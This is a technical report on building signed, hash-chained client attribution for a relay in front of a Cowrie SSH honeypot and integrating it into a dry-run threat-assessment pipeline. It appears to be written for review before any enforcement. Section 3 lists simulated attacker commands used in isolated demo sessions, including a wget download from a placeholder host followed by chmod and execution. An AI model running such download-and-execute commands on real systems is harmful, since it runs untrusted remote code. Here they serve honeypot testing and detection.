# Task 26A — Verified Client Attribution for Threat Assessment

Date: 2026-11-11 · Status: **implemented and validated; stopped for review** · No enforcement · Nothing committed

## 1. Outcome

| Item | Result |
|---|---|
| Demo ingress `cowrie_demo_ingress` 10.250.25.0/28 (internal, isolated gateway, no IPv6) | created; members are exactly relay .2, test client .3, control client .4 with the planned MACs |
| Relay 172.22.0.2 (Cowrie-facing) and 172.21.0.2 (published path) | preserved |
| Relay listeners | exactly `172.21.0.2:2222` (published) and `10.250.25.2:2222` (demo); no wildcard bind |
| IP forwarding | 0 in the relay **and** in both client namespaces |
| Isolation probes from both clients (before any session) | Cowrie, relay internal/frontend, VM network, internet, DNS all fail |
| Signed relay records | 11 records, hash chain + Ed25519 signatures verify |
| Correlation of the 5 demo sessions | S1 published → `unattributed:published_listener`; S2–S5 → `attributable_via_proxy_mapping`; client tuples match what each client reported (4/4) |
| Assessment (threat-assessment 1.1.0, policy 2.1.0) | S4 test client shell → **propose (dry-run, manual approval pending, not executed), subject 10.250.25.3**; S5 control client shell → **review** (`enforcement_excluded`); banners → abstain |
| Failure variants (18 on captured data + 5 assessment-side) | every tampered, missing, expired, unverifiable or inconsistent input leaves the session unattributed and never proposes |
| Tests | 499 passed (447 existing + 52 new) |
| Regression | 4,447 Task 24 sessions reproduce exactly under 1.1.0 with the v1 config |
| Behavioural evidence, models, Dataset V2, sealed data | unchanged (manifests re-verified; sealed data not accessed) |
| Enforcement | none: no firewall rule references either client |

## 2. Implementation

### 2.1 Attributing relay (`cowrie/attributing_relay/attributing_relay.py`)
Replaces Twisted `portforward` inside the same pinned image, user, and hardening. Per explicitly bound listener:

1. Accept the connection and capture the client from the **accepted socket** (`getPeer()`), never from the client's bytes.
2. Weak-host guard: if the accepted local address ≠ the listener bind, write `connection_rejected` and abort.
3. Pause the client and connect to `cowrie:2222`.
4. On upstream connect, write `connection_open`. It records the client IP/port, listener/mode, accepted local address, the relay→Cowrie **upstream local tuple** (`getHost()` = the `src_ip:src_port` that Cowrie logs) and timestamps.
5. Copy bytes in both directions.
6. On close, write `connection_close` (same connection_id, upstream tuple, `closed_utc`, byte counts).
7. On upstream failure, or if the client left before the upstream connected, write `connection_rejected`. No mapping is produced.

Every record is canonical JSON with `seq`, `prev_hash` (hash chain from 64 zeros), `written_utc` and `key_id`:
- `record_hash` = SHA-256 of the record without `record_hash`/`signature`;
- `signature` = Ed25519 over the ASCII `record_hash`;
- the log is append-only and fsync'd per record.

`relay_start` announces the config SHA-256, the listeners and the public-key SHA-256.

Configuration lives in `relay_config.json` (sha256 `401773de…`, identical to the hash in the signed `relay_start` record).

### 2.2 Key handling
- An Ed25519 key was generated on the host. The private key, `cowrie/attributing_relay/secrets/relay_mapping_ed25519.pem`, is mounted **read-only into the relay only**. `secrets/.gitignore` = `*`.
- The public key (`relay_mapping_ed25519.pub.pem`) is pinned by SHA-256 `a52b8c52…d272bf` in `configs/threat_attribution_v2.json`, together with its validity window (2026-11-11 → 2026-12-11).
- `client_attribution` and `threat_assessment` contain no private-key loading or signing code; a test enforces this. No approval-signing key exists yet.

### 2.3 `client_attribution` package (client-attribution-1.0.0)
- **`records.verify_records`** checks the whole log in one pass: schema, required fields, `seq` continuity, `prev_hash` linkage, recomputed hash, pinned `key_id`, signature, key validity, and the key announced by `relay_start`. Any failure makes the whole log untrusted.
- **`correlate`** takes each Cowrie `session.connect` and attributes it only if every condition below holds:
  1. it is not a registered diagnostic session;
  2. it has a single connect event;
  3. `src_ip` is a configured relay upstream;
  4. `src_port` is present;
  5. the log is verified;
  6. **exactly one** `connection_open` record has the same `(upstream_local_ip, upstream_local_port)`, with `accepted ≤ connect + 2 s` and `|connect − upstream_connected| ≤ 2 s`;
  7. its `connection_id` is unique;
  8. the record is ≤ 24 h old;
  9. it arrived on a demo listener;
  10. the accepted local address equals the listener;
  11. the client is in the registry;
  12. the close is consistent.

  The close is matched **by Cowrie session ID**, because Cowrie's close event has no `src_port`. If both closed, the close times must agree within 2 s with the same tuple, and not before the accept. If Cowrie closed but the relay did not, the session is inconsistent.
- Anything else gets an explicit `unattributed:*` state.

### 2.4 Threat assessment 1.1.0 (integration)
- **`AttributionConfig`:** accepts schema `threat-attribution-config-2`.
  - It requires a `client_attribution` mapping block and an explicit `enforcement_excluded_sources` list.
  - Mapping relays must be configured relays.
  - v1 still rejects any mapping.
- **`attribute(record, cfg, mapping_result)`:**
  - When a relay source has the mapping enabled, attribution uses only the verified correlation result.
  - The mapped client then goes through protected → shared → enforcement-excluded checks.
  - If it passes, the state is `attributable_via_proxy_mapping` with `subject` = client IP.
  - If no result is available, the state is `unattributed:mapping_unavailable`.
- **`assess(record, client_attribution=None)`** changes:
  - The correlation output's `config_digest` must equal the loaded attribution config digest; otherwise gate 7 fails and no mapping is used.
  - Gate 5 accepts `attributable` or `attributable_via_proxy_mapping`.
  - Gate 6 additionally rejects `enforcement_excluded`.
  - The proposal subject is the attributed client and records `subject_basis` and `relay_connection_id`.
  - A mapping supplied with a v1 config is a processing error (abstain).
- **Unchanged:** severity definitions, finding construction, evidence-level use, gates 1–4 and 8, and the tier logic. Findings are identical with and without the mapping (`demo_session_results.csv`, `findings_identical_without_mapping` = True for all 5).
- **New configs:** `configs/threat_attribution_v2.json` (digest `612d6360…`) and `configs/defence_policy_v2_1.json`.
  - The policy pins that digest.
  - Its proposal conditions and proposed action are identical to 2.0.0.
  - v1 / v2.0 configs are byte-identical (`46109a31…`, `24fd8cf4…`).

### 2.5 Deployment (`cowrie/docker-compose.yml`, backup `cowrie/backups/pre_client_attribution_20261111T171555Z/`)
Full diff: `evidence/docker-compose.diff`.
- **Relay:** new entrypoint and command; read-only mounts for code, config and key; a read-write mount for `records/`.
- **Relay sysctls:** forwarding 0 is kept, and `arp_ignore=1` / `arp_announce=2` are added.
- **Relay networks:** a third network with a fixed IP and MAC.
- **`demo-test-client` and `demo-control-client`:**
  - same pinned image and hardening anchor (cap_drop ALL, no-new-privileges, read-only, tmpfs);
  - `restart: "no"`, pids 32, 128 MiB;
  - forwarding sysctls = 0;
  - idle `signal.pause()` (the image is distroless);
  - mount only `demo_client.py`.
- **Network `cowrie_demo_ingress`:** subnet 10.250.25.0/28, ip_range .8/29, internal, `gateway_mode_ipv4: isolated`, IPv6 off.
- **Applied with** `up -d --no-deps --force-recreate ssh-relay demo-test-client demo-control-client`.
  - The clients were recreated once more, before any session, to add the forwarding sysctls (they had inherited `ip_forward=1`).
  - Cowrie `0bec5a78b1cb` was not touched: started 2026-11-10T12:30:30Z, 0 restarts, and the rendered service is identical.

## 3. Demo sessions (all after the Cowrie log baseline of 21,854 lines)

| | Path | Cowrie session | Correlation | Attribution | Tier |
|---|---|---|---|---|---|
| S1 | host → 127.0.0.1:2223 (banner) | 9441bcce555c | `unattributed:published_listener` (peer 172.21.0.1) | same | abstain |
| S2 | test client banner | acc2bad4a442 | attributable → 10.250.25.3:38204 | attributable_via_proxy_mapping | abstain (no auth) |
| S3 | control client banner | d588636ce120 | attributable → 10.250.25.4:52586 | enforcement_excluded | abstain |
| S4 | test client shell | 3eede5e19e25 | attributable → 10.250.25.3:42370, close consistent | attributable_via_proxy_mapping | **propose** (dry-run) |
| S5 | control client shell | 4542a85f37ec | attributable → 10.250.25.4:46198, close consistent | enforcement_excluded | **review** (gates 5, 6) |

- S4 and S5 commands: `uname -a`, `wget http://files.example/x.sh -O x.sh`, `chmod +x x.sh`, `./x.sh`.
- Both produce findings: download attempt S2/E2 and download-and-execute attempt S3/E2; action indicators EXEC-1 and XFER-1.
- Without the mapping, S4 is `review` (gate 5): attribution is the only difference.
- S4 proposal:
  - `block_source_ip` subject 10.250.25.3;
  - inverse `unblock_source_ip`;
  - TTL 86400;
  - `mode: dry_run`, `manual_approval: pending`, `execution: not_executed`;
  - relay connection `cbc790bd…`.
- Audit chain: 5 entries, intact (`evidence/demo_audit*.json*`).
- The five demo sessions are registered for exclusion from datasets and evaluations in `demo_session_exclusion.md`.

## 4. Correlation and failure tests
- Unit tests: `tests/test_client_attribution.py` (52).
- Captured-data variants: `correlation_tests.csv` (18).
- Assessment-side: `assessment_integration_tests.csv` (5).
- Summary: `failure_cases.md`.

## 5. Security checks
See `security_checks.md`.

## 6. Limitations
See `limitations.md`.

## 7. Files
- **Reports:**
  - `report.md`
  - `signed_record_examples.md`
  - `failure_cases.md`
  - `security_checks.md`
  - `limitations.md`
  - `demo_session_exclusion.md`
- **Scripts:** `run_attribution.py` (verification, correlation, assessment, variants) and `regression_v1.py`.
- **Result files:**
  - `demo_session_results.csv`
  - `correlation_tests.csv`
  - `assessment_integration_tests.csv`
  - `regression_v1_results.json`
  - `test_results.txt`
- **`evidence/`:**
  - captured Cowrie events and relay log;
  - record verification and correlation result;
  - evidence, assessments and audit;
  - session client outputs;
  - isolation probes and namespace inspection;
  - final state and compose diff.
- `SHA256SUMS`

Stopped here. Human approval and dynamic response (enforcement controller) are not implemented and await review.
